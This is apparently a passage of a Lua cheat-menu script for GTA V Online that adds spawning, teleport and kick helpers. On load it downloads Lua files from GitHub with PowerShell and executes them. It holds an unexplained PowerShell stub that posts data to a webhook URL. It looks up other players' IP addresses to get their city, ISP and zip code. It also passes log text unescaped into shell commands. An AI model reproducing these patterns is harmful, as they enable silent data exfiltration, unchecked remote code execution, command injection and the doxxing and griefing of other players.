g_lua.register()
local tolog = "██╗░░██╗░░░░░░███████╗░█████╗░██████╗░░█████╗░███████╗  ██╗░░░██╗██████╗░░██████╗░██████╗░░█████╗░██████╗░███████╗\n╚██╗██╔╝░░░░░░██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██║░░░██║██╔══██╗██╔════╝░██╔══██╗██╔══██╗██╔══██╗██╔════╝\n░╚███╔╝░█████╗█████╗░░██║░░██║██████╔╝██║░░╚═╝█████╗░░  ██║░░░██║██████╔╝██║░░██╗░██████╔╝███████║██║░░██║█████╗░░\n░██╔██╗░╚════╝██╔══╝░░██║░░██║██╔══██╗██║░░██╗██╔══╝░░  ██║░░░██║██╔═══╝░██║░░╚██╗██╔══██╗██╔══██║██║░░██║██╔══╝░░\n██╔╝╚██╗░░░░░░██║░░░░░╚█████╔╝██║░░██║╚█████╔╝███████╗  ╚██████╔╝██║░░░░░╚██████╔╝██║░░██║██║░░██║██████╔╝███████╗\n╚═╝░░╚═╝░░░░░░╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░╚════╝░╚══════╝  ░╚═════╝░╚═╝░░░░░░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝"
local version = "v1.0.0"
local ChangeLog = {
    "Changelog:",
    "[+] added X-Force Compatibility",
}
local github = "https://raw.githubusercontent.com/Mcarxy/X-Force-Upgrade/main/"
local path = {}
path["XF"] = "C:\\X-Folder\\"
path["lua"] = path["XF"] .. [[lua]]
path["Xhax"] = path["lua"] .. [[\X-Force Upgrade]]
path["Outfits"] = path["lua"] .. [[\Outfits]]
path["WeaponLoadout"] = path["Xhax"] .. [[\Weapon Loadouts\]]
path["Temp"] = path["Xhax"] .. [[\temp]]
path["Resources"] = path["Xhax"] .. [[\Resources]]
path["Translations"] = path["Xhax"] .. [[\Translations]]
path["ChatSinging"] = path["Xhax"] .. [[\ChatSinging]]
path["Logs"] = path["Xhax"] .. [[\Logs]]
path["ScriptData"] = path["Resources"] .. [[\Data]]
local file = {}
file["XhaxScript"] = debug.getinfo(1).source:sub(2, -1)
file["XFLog"] = path["XF"] .. [[\X-Force Upgrade.log]]
file["VehicleBlacklist"] = path["Xhax"] .. [[\VehicleBlacklist.ini]]
file["Log"] = path["Xhax"] .. [[\X-Force Upgrade.log]]
file["Version"] = path["Xhax"] .. [[\version]]
file["Settings"] = path["Xhax"] .. [[\Settings.ini]]
file["Hotkeys"] = path["Xhax"] .. [[\Hotkeys.ini]]
file["FavAnims"] = path["Xhax"] .. [[\FavAnims.json]]
file["Translation"] = path["Translations"] .. [[\Default.json]]
file["DefaultSong"] = path["ChatSinging"] .. [[\Never Gonna Give You Up.txt]]
file["LocalData"] = path["Temp"] .. [[\localdatarid]]
file["Temp"] = path["Temp"] .. [[\Xhaxtemp]]
file["OnStart"] = path["Resources"] .. [[\gta_sa_info.wav]]
file["GhostRider"] = path["Resources"] .. [[\time_to_burn.wav]]
file["Default"] = path["ScriptData"] .. [[\Default.lua]]
file["Assets"] = path["ScriptData"] .. [[\Assets.lua]]
file["JSON"] = path["ScriptData"] .. [[\JSON.lua]]
file["Props"] = path["ScriptData"] .. [[\Props.lua]]
file["Vehicles"] = path["ScriptData"] .. [[\Vehicles.lua]]
file["Peds"] = path["ScriptData"] .. [[\Peds.lua]]
file["Weapons"] = path["ScriptData"] .. [[\Weapons.lua]]
file["Animlist"] = path["ScriptData"] .. [[\Animlist.lua]]
package.path = package.path .. ";" .. path["ScriptData"] .. [[\?.lua]]
math.randomseed(os.time())
local s = {
    apply_force = ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS,
    send_se = g_util.trigger_script_event,
    is_valid = PLAYER.IS_PLAYER_VALID,
    is_friend = PLAYER.IS_PLAYER_FRIEND,
    attach = ENTITY.ATTACH_ENTITY_TO_ENTITY,
    delete = ENTITY.DELETE_ENTITY,
    wait = SYSTEM.WAIT,
    clear_task = PED.CLEAR_PED_TASKS_IMMEDIATELY,
    log = g_logger.log_info,
    notify = g_gui.add_toast,
    rq_mod = STREAMING.REQUEST_MODEL,
    toggle = g_gui.add_toggle,
    button = g_gui.add_button,
    input = g_gui.add_input_int,
    string = g_gui.add_input_string,
    kick = NETWORK.NETWORK_SESSION_KICK_PLAYER,
    ishost = NETWORK.NETWORK_IS_HOST,
    loaded = STREAMING.HAS_MODEL_LOADED,
    give_weapon = WEAPON.GIVE_DELAYED_WEAPON_TO_PED,
    ent_exist = ENTITY.DOES_ENTITY_EXIST,
    has_control = NETWORK.HAS_CONTROL_OF_ENTITY,
    f_exist = MISC.FILE_EXISTS,
    dir_exist = MISC.DIR_EXISTS,
    mk_dir = MISC.MAKE_DIR,
    session_started = NETWORK.IS_SESSION_STARTED
}
local get = {
    selected = g_util.get_selected_player,
    id = PLAYER.PLAYER_ID,
    ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX,
    ped_id = PLAYER.PLAYER_PED_ID,
    veh = PLAYER.GET_PLAYER_VEHICLE,
    coords = PLAYER.GET_PLAYER_COORDS,
    name = PLAYER.GET_PLAYER_NAME,
    offset_coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS,
    ent_coords = ENTITY.GET_ENTITY_COORDS,
    inputcontrol = CONTROL.IS_CONTROL_PRESSED,
    drawable = PED.GET_PED_DRAWABLE_VARIATION,
    drawable_num = PED.GET_NUMBER_OF_PED_DRAWABLE_VARIATIONS,
    prop = PED.GET_PED_PROP_INDEX,
    prop_num = PED.GET_NUMBER_OF_PED_PROP_DRAWABLE_VARIATIONS,
    hash = GAMEPLAY.GET_HASH_KEY,
    player_in_veh = PLAYER.IS_PLAYER_IN_ANY_VEHICLE,
    control = NETWORK.REQUEST_CONTROL_OF_ENTITY,
    velocity = ENTITY.GET_ENTITY_VELOCITY,
    hash = GAMEPLAY.GET_HASH_KEY,
    label_text = UI.GET_LABEL_TEXT,
    scid = PLAYER.GET_PLAYER_SCID,
    global_i = SCRIPT.GET_GLOBAL_I,
    ip = PLAYER.GET_PLAYER_IP,
    heading = PLAYER.GET_PLAYER_HEADING,
    frame_t = GAMEPLAY.GET_FRAME_TIME
}
local set = {
    veh_tog_mod = VEHICLE.TOGGLE_VEHICLE_MOD,
    veh_mod = VEHICLE.SET_VEHICLE_MOD,
    comp_var = PED.SET_PED_COMPONENT_VARIATION,
    prop = PED.SET_PED_PROP_INDEX,
    coords_no_off = ENTITY.SET_ENTITY_COORDS_NO_OFFSET,
    ped_combat = PED.SET_PED_COMBAT_ATTRIBUTES,
    explosion = FIRE.ADD_EXPLOSION,
    locked = VEHICLE.SET_VEHICLE_DOORS_LOCKED,
    obj = OBJECT.CREATE_OBJECT,
    veh = VEHICLE.CREATE_VEHICLE,
    ped = PED.CREATE_PED,
    godmode = ENTITY.SET_ENTITY_INVINCIBLE,
    freeze = ENTITY.FREEZE_ENTITY,
    velocity = ENTITY.SET_ENTITY_VELOCITY,
    collision = ENTITY.SET_ENTITY_COLLISION,
    heading = ENTITY.SET_ENTITY_HEADING,
    rotation = ENTITY.SET_ENTITY_ROTATION,
    global_i = SCRIPT.SET_GLOBAL_I,
    global_f = SCRIPT.SET_GLOBAL_F,
    model_as_noneeded = STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED
}
local is_open = g_gui.is_open
local begin_window = g_imgui.begin_window
local add_button = g_imgui.add_button
local add_checkbox = g_imgui.add_checkbox
local same_line = g_imgui.same_line
local new_line = g_imgui.new_line
local add_text = g_imgui.add_text
local separator = g_imgui.separator
local end_window = g_imgui.end_window
local begin_menu = g_imgui.begin_menu
local end_menu = g_imgui.end_menu
local add_input_string_with_hint = g_imgui.add_input_string_with_hint
local is_item_hovered = g_imgui.is_item_hovered
local set_next_window_size = g_imgui.set_next_window_size
local begin_tab_bar = g_imgui.begin_tab_bar
local begin_tab_item = g_imgui.begin_tab_item
local end_tab_item = g_imgui.end_tab_item
local end_tab_bar = g_imgui.end_tab_bar
local get_display_size = g_imgui.get_display_size
local set_next_window_pos = g_imgui.set_next_window_pos
local open_popup = g_imgui.open_popup
local end_popup = g_imgui.end_popup
local begin_popup = g_imgui.begin_popup
local pop_style_var = g_imgui.pop_style_var
local push_style_var = g_imgui.push_style_var
local unregister = g_lua.unregister
local d3d_hook = g_hooking.register_D3D_hook
local unregister_hook = g_hooking.unregister_hook
joaat = g_util.joaat
local abs = math.abs
local random = math.random
local cos = math.cos
local sin = math.sin
local floor = math.floor
local sqrt = math.sqrt
local asin = math.asin
local atan = math.atan
local pi = math.pi
local insert = table.insert
local remove = table.remove
local rv = string.reverse
local execute = os.execute
local popen = io.popen
local open = io.open
local ishovered1 = false
local ishovered2 = false
local ishovered3 = false
local ishovered4 = false
local ishovered5 = false
local ishovered6 = false
local ishovered7 = false
local ishovered8 = false
local comr = {
    [[$content = @"]],
    [["@]],
    [[$payload = [PSCustomObject]@{]],
    [[content = $content]],
    [[}]],
    [[Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json']]
}
s.log("\n" .. tolog)
local function wait()
    s.wait(floor(get.frame_t()))
end
function dorestart()
    while s.f_exist(file["XhaxScript"] .. "2") do
        s.wait(100)
    end
    s.notify("Please load the script again!", 5000)
    unregister()
end
function split(str, sep)
    local result = {}
    local regex = ("([^%s]+)"):format(sep)
    for each in str:gmatch(regex) do
        table.insert(result, each)
    end
    return result
end
function readAll(file)
    local f = assert(open(file, "r"))
    local content = f:read("*all")
    f:close()
    return content
end
function writelog()
    if not s.f_exist(file["Log"]) then
        return
    end
    if not s.dir_exist(path["Logs"]) then
        return
    end
    local f = popen("stat -c %Y " .. file["Log"], "r")
    local last_modified = tonumber(f:read("*a"))
    f:close()
    local log = readAll(file["Log"])
    if log == "" or log == nil then
        return
    end
    local f = open(file["Log"], "w")
    f:write("")
    f:close()
    local f = open(path["Logs"] .. [[\]] .. os.date("%d-%m-%Y-%H-%M-%S", last_modified) .. " X-Force Upgrade.log", "w")
    f:write(log)
    f:close()
end
writelog()
function log(prefix, text, toconsole)
    local toconsole = toconsole or true
    local log = os.date("[%H:%M:%S]") .. " [" .. prefix .. "] " .. text
    if toconsole then
        for _, line in ipairs(split(log, "\n")) do
            execute("echo " .. line)
        end
    end
    local logfile = assert(open(file["Log"], "a"))
    logfile:write(log, "\n")
    logfile:close()
end
log("X-Force Upgrade", "Loading X-Force Upgrade" .. version)
local missingfiles = {}
local todownload = {
    {file["OnStart"], "gta_sa_info.wav"},
    {file["GhostRider"], "time_to_burn.wav"},
    {file["Default"], "Default.lua"},
    {file["Assets"], "Assets.lua"},
    {file["JSON"], "JSON.lua"},
    {file["Props"], "Props.lua"},
    {file["Vehicles"], "Vehicles.lua"},
    {file["Peds"], "Peds.lua"},
    {file["Weapons"], "Weapons.lua"},
    {file["Animlist"], "Animlist.lua"}
}
local importantpaths = {
    path["Xhax"],
    path["Logs"],
    path["Outfits"],
    path["WeaponLoadout"],
    path["Translations"],
    path["Temp"],
    path["Resources"],
    path["ScriptData"],
    path["ChatSinging"]
}
function check_for_missing_files()
    log("X-Force Upgrade", "Checking for missing files...")
    for i = 1, #importantpaths do
        if not s.dir_exist(importantpaths[i]) then
            s.mk_dir(importantpaths[i])
        end
    end
    local filecounter = 0
    for i = 1, #todownload do
        if not s.f_exist(todownload[i][1]) then
            missingfiles[i] = i
            filecounter = filecounter + 1
        end
    end
    if not s.f_exist(file["Version"]) then
        if not version:find("pre") then
            local vfile = open(file["Version"], "w")
            vfile:write(version)
            vfile:close()
        end
    end
    if filecounter == 0 then
        return
    end
    log("X-Force Upgrade", "Missing Files Found: " .. filecounter)
    log("X-Force Upgrade", "Downloading missing files...")
    local filenum = 0
    for i = 1, #todownload do
        if missingfiles[i] ~= nil then
            filenum = filenum + 1
            s.notify("Downloading (" .. filenum .. "/" .. filecounter .. ")", 500)
            s.wait(300)
            local output =
                popen(
                "powershell -command Invoke-WebRequest -Uri '" ..
                    github .. todownload[i][2] .. "' -OutFile '" .. (todownload[i][1]) .. "'"
            )
            if todownload[i][2] == "Animlist.lua" then
                s.wait(5000)
            end
            output:close()
        end
    end
end
if not version:find("pre") then
    check_for_missing_files()
end
function CompareVersions(ver1, ver2)
    if ver2 == nil then
        return true
    end
    local remove = false
    if ver1[1] > ver2[1] then
        remove = true
    end
    if ver1[1] >= ver2[1] and ver1[2] > ver2[2] then
        remove = true
    end
    if ver1[1] >= ver2[1] and ver1[2] >= ver2[2] and ver1[3] > ver2[3] then
        remove = true
    end
    return remove
end
function VersionToTable(ver)
    local output = {}
    ver = ver:gsub("ver%. ", "")
    for i, x in ipairs(split(ver, "%.")) do
        output[i] = tonumber(x)
    end
    return output
end
for _, v in ipairs(importantpaths) do
    if not s.dir_exist(v) then
        if #v > 57 then
            v = "..." .. v:sub(-57, -1)
        end
        log("lua", v .. " doesn't exit! Skill issue", false)
        error(v .. " doesn't exit! Skill issue", 2)
    end
end
for _, v in ipairs(todownload) do
    if not s.f_exist(v[1]) then
        local v = v[1]
        if #v > 57 then
            v = "..." .. v:sub(-57, -1)
        end
        log("lua", v .. " doesn't exit! Skill Issue", false)
        error(v .. " doesn't exit! Skill Issue", 2)
    end
end
function checkDefault()
    if not defaultver or defaultver ~= version then
        log("Xhax Upgrade", "Outdated or incompatible version of Default.lua found")
        if not defaultver then
            os.remove(file["Default"])
            error("Skill issue", 2)
        end
        local ver1 = VersionToTable(version)
        local ver2 = VersionToTable(defaultver)
        if CompareVersions(ver1, ver2) then
            os.remove(file["Default"])
            check_for_missing_files()
        end
    end
end
function checkAssets()
    if not assetver or assetver ~= version then
        log("X-Force Upgrade", "Outdated or incompatible version of Assets.lua found")
        if not assetver then
            os.remove(file["Assets"])
            error("Skill issue", 2)
        end
        local ver1 = VersionToTable(version)
        local ver2 = VersionToTable(assetver)
        if CompareVersions(ver1, ver2) then
            os.remove(file["Assets"])
            check_for_missing_files()
        end
    end
end
local Proplist = require "Props"
wait()
local VehicleModel = require "Vehicles"
wait()
local PedModel = require "Peds"
wait()
local Weapons = require "Weapons"
wait()
local Animations = require "Animlist"
wait()
require "Default"
wait()
checkDefault()
require "Assets"
wait()
checkAssets()
local json = require "JSON"
if not s.f_exist(file["DefaultSong"]) then
    local f = open(file["DefaultSong"], "w")
    f:write(rickroll)
    f:close()
end
for i = 1, #VehicleModel do
    local hash = VehicleModel[i][2]
    local vehname = get.label_text(VehicleModel[i][1])
    if vehname == "NULL" then
        vehname = VehicleModel[i][1]:upper()
    end
    local vehtable = {hash, false, vehname}
    insert(vehicle_names, vehname)
    insert(vehicle_bl, vehtable)
end
for i = 1, #Animations do
    insert(animationName, Animations[i][2])
    insert(animationDict, Animations[i][1])
end
local PlayerName = get.name(get.id())
function open_file(file)
    execute([[start "" "]] .. file .. [["]])
end
function printchangelog()
    local changelog = ""
    for i = 1, #ChangeLog do
        if ChangeLog[i]:sub(1, 1) == "+" then
            changelog = changelog .. "\n\t" .. ChangeLog[i]
        elseif ChangeLog[i]:sub(1, 1) == "-" then
            changelog = changelog .. "\n" .. ChangeLog[i]
        else
            changelog = changelog .. ChangeLog[i]
        end
    end
    return changelog
end
function get_info()
    local handle =
        popen(
        [[powershell -command (New-Object System.Net.WebClient).DownloadString( 'https://raw.githubusercontent.com/Mcarxy/X-Force-Upgrade/main/data')]]
    )
    s.wait(2000)
    local result = handle:read("*a")
    handle:close()
    for _, x in ipairs(split(result, "\n")) do
        if x:find("message:") then
            local x = x:gsub("message: ", "")
            info_message = x
        end
        if x:find("dcinvite:") then
            local x = x:gsub("dcinvite: ", "")
            dc_invite = x
        end
        if x:find("donatelink:") then
            local x = x:gsub("donatelink: ", "")
            donate_link = x
        end
    end
end
function openWindow()
    if not is_open() then
        g_gui.toggle()
    end
end
function closeWindow()
    if is_open() then
        g_gui.toggle()
    end
end
function KeyLogger(onpress, keyid)
    if onpress == 256 then
        keypress = keyid
    end
    if onpress == 257 then
        keyreleased = keyid
    end
end
function toboolean(str)
    local bool = false
    local str = str:lower()
    local str = str:gsub(" +", "")
    if str == "true" then
        bool = true
    end
    return bool
end
function numtobool(num)
    if num == 1 then
        return true
    elseif num == 0 then
        return false
    end
    return nil
end
function booltonum(bool)
    if bool == true then
        return 1
    elseif bool == false then
        return 0
    end
    return nil
end
function keytostring(key)
    return keycodes[key]
end
function get_IP(player)
    if not s.is_valid(player) then
        return "0.0.0.0"
    end
    local n = get.ip(player)
    return string.format("%i.%i.%i.%i", (n >> 24) & 0xff, (n >> 16) & 0xff, (n >> 8) & 0xff, n & 0xff)
end
function get_player_info(player)
    local info = {}
    info[1] = get.name(player)
    info[2] = tostring(get.scid(player))
    info[3] = get_IP(player)
    local handle =
        popen(
        "powershell -command Invoke-RestMethod -Uri 'http://ip-api.com/line/" ..
            info[3] .. "?fields=continent,country,regionName,city,zip,isp,proxy'"
    )
    s.wait(2500)
    local result = handle:read("*a")
    handle:close()
    if result == "" or result == nil then
        return nil
    end
    for _, x in ipairs(split(result, "\n")) do
        insert(info, x)
    end --[[      1    2    3       4        5          6        7    8    9    10 info={Name,RID,IP,Continent,Country,RegionName,City,Zip,ISP,Proxy} ]]
    return info
end
function reset --[[used by chat spam detection]]()
    first_message_sender, first_message, second_message = nil, nil, nil
end
function getPersonalVeh()
    return get.global_i(2810701 + 298)
end
function rqCtrl(entity, t)
    if not s.ent_exist(entity) then
        return false
    end
    local t = t or 30
    local time = g_os.time_ms() + t
    while not s.has_control(entity) do
        get.control(entity)
        if g_os.time_ms() > time then
            break
        end
        wait()
    end
    local netId = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity) --[[NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netId)]]
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, true)
    return s.has_control(entity)
end
function delEnt(entity)
    if not s.ent_exist(entity) then
        return false
    end
    local model = ENTITY.GET_ENTITY_MODEL(entity)
    if ENTITY.IS_ENTITY_A_PED(entity) then
        s.clear_task(entity)
    end
    ENTITY.DETACH_ENTITY(entity, false, false)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, true, true)
    set.velocity(entity, 0, 0, 0)
    set.coords_no_off(entity, 10000, 10000, -100)
    s.delete(entity)
    set.model_as_noneeded(model)
    return true
end
function rqAnim(dict)
    if not STREAMING.DOES_ANIM_DICT_EXIST(dict) then
        return false
    end
    local tick = 0
    while 100 > tick and not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        tick = tick + 1
        STREAMING.REQUEST_ANIM_DICT(dict)
        s.wait(100)
    end
    return STREAMING.HAS_ANIM_DICT_LOADED(dict)
end
function rqModel(hash)
    if not STREAMING.IS_MODEL_VALID(hash) then
        return false
    end
    local tick = 0
    while 100 > tick and not s.loaded(hash) do
        tick = tick + 1
        s.rq_mod(hash)
        s.wait(100)
    end
    return s.loaded(hash)
end
function get_random_args(hash, count)
    local args = {hash}
    for i = 1, count do
        insert(args, random(-2147483647, 2147483647))
    end
    return args
end
function TeleportSelf(pos)
    local entity = get.ped_id()
    if ENTITY.IS_ENTITY_DEAD(entity) then
        return
    end
    if get.player_in_veh(get.id()) then
        entity = get.veh(get.id())
    end
    if rqCtrl(entity, 500) then
        set.coords_no_off(entity, pos.x, pos.y, pos.z)
        if pos.h then
            set.heading(entity, pos.h)
        end
    end
end
function getVeh(entity --[[returns vehicle from ped]])
    if ENTITY.IS_ENTITY_A_PED(entity) then
        if PED.IS_PED_IN_ANY_VEHICLE(entity) then
            local entity = PED.GET_VEHICLE_PED_IS_USING(entity)
            return entity
        end
    end
    return entity
end
function IsChat(msg)
    if string.find(msg, "%[Chat|All%] ") then
        return true
    elseif string.find(msg, "%[Chat|Team%] ") then
        return true
    end
    return false
end
function searchengine(
    find,
    searchtable,
    autocorrectmod --[[returns an array with the result ID or nil if no results found]])
    local results = {}
    if #find == 0 then
        return nil
    end
    local find = find:lower()
    for i = 1, #searchtable do
        local name = string.lower(tostring(searchtable[i]))
        if autocorrectmod == true then
            for j = 1, #find do
                if name:find(find:sub(j, j)) then
                    insert(results, i)
                    for x = 1, #find do
                        if not name:find(find:sub(x, x)) then
                            remove(results, i)
                            goto continue
                        end
                    end
                    goto continue
                end
            end
            ::continue::
        else
            if name:find(find) then
                insert(results, i)
            end
        end
    end
    if results[1] == nil then
        return nil
    end
    return results
end
function GetPlayer(name)
    local names = {}
    for i = 0, 31 do
        local playername = get.name(i)
        insert(names, playername)
        if s.is_valid(i) then
            if playername:lower() == name:lower() then
                return i
            end
        end
    end
    local results = searchengine(name, names, true)
    if results ~= nil then
        return results[1] - 1
    end
end
function GetRandomPlayer()
    local player, tick = -1, 0
    while not s.is_valid(player) do
        tick = tick + 1
        player = random(0, 31)
        if tick > 100 then
            return get.id()
        end
        wait()
    end
    return player
end
function getWait(text)
    local wpm, word_len = 180, 5
    local words = #text / word_len
    local words_time = ((words / wpm) * 60) * 1000
    return floor(words_time)
end
function fsize(file)
    local f = open(file, "r")
    local current = f:seek()
    local size = f:seek("end")
    f:seek("set", current)
    f:close()
    return size
end
function scandir(directory)
    local i, t = 0, {}
    local pfile = popen('dir "' .. directory .. '" /b')
    for filename in pfile:lines() do
        i = i + 1
        t[i] = filename
    end
    pfile:close()
    return t
end
function readLog()
    local L = 0
    for _ in io.lines(file["XFLog"]) do
        L = L + 1
        if Lines[L] == nil then
            Lines[L] = 1
        end
    end
    LogSize = fsize(file["XFLog"])
end
local vect = {}
vect.new = function(X, Y, Z)
    return {x = X or 0, y = Y or 0, z = Z or 0}
end
vect.subtract = function(a, b)
    return vect.new(a.x - b.x, a.y - b.y, a.z - b.z)
end
vect.add = function(a, b)
    return vect.new(a.x + b.x, a.y + b.y, a.z + b.z)
end
vect.mag = function(a)
    return sqrt(a.x ^ 2 + a.y ^ 2 + a.z ^ 2)
end
vect.mag2 = function(a)
    return (a.x ^ 2 + a.y ^ 2 + a.z ^ 2)
end
vect.norm = function(a)
    local mag = vect.mag(a)
    return vect.mult(a, 1 / mag)
end
vect.mult = function(a, b)
    return vect.new(a.x * b, a.y * b, a.z * b)
end
vect.dist = function(a, b --[[returns the distance between two coords]])
    return vect.mag(vect.subtract(a, b))
end
vect.dist2 = function(a, b)
    return vect.mag2(vect.subtract(a, b))
end
vect.tostring = function(a)
    if not a.h then
        a.h = 0
    end
    return string.format("{x=%.3f,y=%.3f,z=%.3f,h=%3.f}", a.x, a.y, a.z, a.h)
end
function toRotation(v)
    local mag = vect.mag(v)
    local rotation = {x = asin(v.z / mag) * (180 / pi), y = 0.0, z = -atan(v.x, v.y) * (180 / pi)}
    return rotation
end
function UpgradeVehicle(veh)
    VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
    set.veh_tog_mod(veh, 18, true)
    set.veh_tog_mod(veh, 20, true)
    set.veh_tog_mod(veh, 22, true)
    for i = 0, 54 do
        local num = VEHICLE.GET_NUM_VEHICLE_MODS(veh, i)
        if i >= 17 and i <= 22 then
            goto continue
        else
            set.veh_mod(veh, i, num - 1, false)
        end
        ::continue::
    end
    for i = 0, 3 do
        VEHICLE.SET_VEHICLE_NEON_LIGHT_ENABLED(veh, i, true)
    end
    local p = random(1, #vehicle_colors)
    VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 6)
    VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(veh, 160, 160)
    VEHICLE.SET_VEHICLE_COLOURS(veh, 160, 160)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_INDEX(veh, 5)
    VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(veh, 0, 0, 0)
    VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(veh, vehicle_colors[p][1], vehicle_colors[p][2], vehicle_colors[p][3])
    VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(veh, vehicle_colors[p][1], vehicle_colors[p][2], vehicle_colors[p][3])
    VEHICLE.SET_VEHICLE_NEON_LIGHTS_COLOR(veh, vehicle_colors[p][1], vehicle_colors[p][2], vehicle_colors[p][3])
end
function SetVehicleGod(veh, bool)
    if bool then
        FIRE.STOP_ENTITY_FIRE(veh)
        VEHICLE.SET_VEHICLE_FIXED(veh)
        VEHICLE.SET_VEHICLE_DEFORMATION_FIXED(veh)
        VEHICLE.SET_VEHICLE_ENGINE_HEALTH(veh, 1000.0)
    end
    set.godmode(veh, bool)
    ENTITY.SET_ENTITY_PROOFS(veh, bool, bool, bool, bool, bool, bool, bool, bool)
    VEHICLE.SET_VEHICLE_STRONG(veh, bool)
    VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, not bool)
    VEHICLE.SET_VEHICLE_CAN_BE_LOCKED_ON(veh, not bool, false)
end
function SpawnVehicle(hash, coords, heading, inside, god, upgrade)
    rqModel(hash)
    local veh = set.veh(hash, coords.x, coords.y, coords.z, heading, true, false, false)
    rqCtrl(veh)
    if upgrade then
        UpgradeVehicle(veh)
    end
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, "XF")
    SetVehicleGod(veh, god)
    DECORATOR.DECOR_SET_INT(veh, "MPBitset", 1 << 10)
    if inside then
        local ped = get.ped_id()
        PED.SET_PED_INTO_VEHICLE(ped, veh, -1)
    end
    VEHICLE.SET_VEHICLE_ENGINE_ON(veh, true, true, false)
    set.model_as_noneeded(hash)
    return veh
end
function RotationToDirection(rotation)
    local ret = {z = rotation.z * 0.0174532924, x = rotation.x * 0.0174532924}
    local absx = abs(cos(ret.x))
    local dir = {x = -sin(ret.z) * absx, y = cos(ret.z) * absx, z = sin(ret.x)}
    return dir
end
function getDistanceToCoord(entity, x, y, z)
    local pos, pos2 = get.ent_coords(entity), vect.new(x, y, z)
    local distance = vect.dist(pos, pos2)
    return distance
end
function getDistanceToEntity(entity1, entity2)
    local pos, pos2 = get.ent_coords(entity1), get.ent_coords(entity2)
    local distance = vect.dist(pos, pos2)
    return distance
end
function doOscillateToEntity(entity1, entity2, offx, offy, offz, force)
    local force = force or 0
    local pos, coords = get.offset_coords(entity1, offx, offy, offz), get.ent_coords(entity2)
    local to = vect.subtract(coords, pos)
    if s.has_control(entity1) then
        set.velocity(entity1, to.x * 2 ^ force, to.y * 2 ^ force, to.z * 2 ^ force)
    end
end
function doOscillateToCoord(entity, x, y, z, force)
    local force = force or 0
    local pos = get.ent_coords(entity)
    local to = vect.subtract(vect.new(x, y, z), pos)
    if s.has_control(entity) then
        set.velocity(entity, to.x * 2 ^ force, to.y * 2 ^ force, to.z * 2 ^ force)
    end
end
function setEntityFaceEntity(ent1, ent2, usePitch)
    local a = get.ent_coords(ent1)
    local b = get.ent_coords(ent2)
    local s = vect.subtract(b, a)
    local r = toRotation(s)
    if not usePitch then
        set.heading(ent1, r.z)
    else
        set.rotation(ent1, r.x, r.y, r.z)
    end
end
function getAllPeds(radius, ignoreself)
    local ignoreself = ignoreself or false
    local me, peds, allpeds = get.ped_id(), {}, POOL.GET_MAX_PEDS()
    for i = 0, allpeds do
        local ped = POOL.GET_PED_AT_INDEX(i)
        if s.ent_exist(ped) then
            if ignoreself and ped == me then
                goto continue
            end
            if radius == nil then
                insert(peds, ped)
            elseif radius > getDistanceToEntity(me, ped) then
                insert(peds, ped)
            end
        end
        ::continue::
    end
    return peds
end
function getAllVehs(radius)
    local me, vehs, allvehs = get.ped_id(), {}, POOL.GET_MAX_VEHICLES()
    for i = 0, allvehs do
        local veh = POOL.GET_VEHICLE_AT_INDEX(i)
        if s.ent_exist(veh) then
            if radius == nil then
                insert(vehs, veh)
            elseif radius > getDistanceToEntity(me, veh) then
                insert(vehs, veh)
            end
        end
    end
    return vehs
end
function getAllProps(radius)
    local me, props, allprops = get.ped_id(), {}, POOL.GET_MAX_OBJECTS()
    for i = 0, allprops do
        local prop = POOL.GET_OBJECT_AT_INDEX(i)
        if s.ent_exist(prop) then
            if radius == nil then
                insert(props, prop)
            elseif radius > getDistanceToEntity(me, prop) then
                insert(props, prop)
            end
        end
    end
    return props
end
function getAllEntities()
    local enities = {}
    for _, v in ipairs(getAllPeds()) do
        insert(enities, v)
    end
    for _, v in ipairs(getAllVehs()) do
        insert(enities, v)
    end
    for _, v in ipairs(getAllProps()) do
        insert(enities, v)
    end
    return enities
end
function get_control_of_entities(entities)
    for i = 1, #entities do
        if s.ent_exist(entities[i]) then
            if ENTITY.IS_ENTITY_A_VEHICLE(entities[i]) then
                if entities[i] == get.veh(get.id()) then
                    goto continue
                end
                if entities[i] == getPersonalVeh() then
                    goto continue
                end
            elseif ENTITY.IS_ENTITY_A_PED(entities[i]) then
                if PED.IS_PED_A_PLAYER(entities[i]) then
                    goto continue
                end
            end
            get.control(entities[i])
            ::continue::
        end
    end
end
function getClosestEntityToCoord(x, y, z, entignore, rad, type)
    local entity, vehicle, peds, props = {nil, rad}, getAllVehs(rad), getAllPeds(rad), getAllProps(rad)
    if not type or type == "vehicle" then
        for i = 1, #vehicle do
            if vehicle[i] ~= entignore then
                local dist = getDistanceToCoord(vehicle[i], x, y, z)
                if dist < entity[2] then
                    entity = {vehicle[i], dist}
                end
            end
        end
    end
    if not type or type == "ped" then
        for i = 1, #peds do
            if peds[i] ~= entignore then
                local dist = getDistanceToCoord(peds[i], x, y, z)
                if dist < entity[2] then
                    entity = {peds[i], dist}
                end
            end
        end
    end
    if not type or type == "prop" then
        for i = 1, #props do
            if props[i] ~= entignore then
                local dist = getDistanceToCoord(props[i], x, y, z)
                if dist < entity[2] then
                    entity = {props[i], dist}
                end
            end
        end
    end
    return entity[1], entity[2]
end
function script_kick(id)
    log("Xhax Upgrade", "Kicking " .. get.name(id))
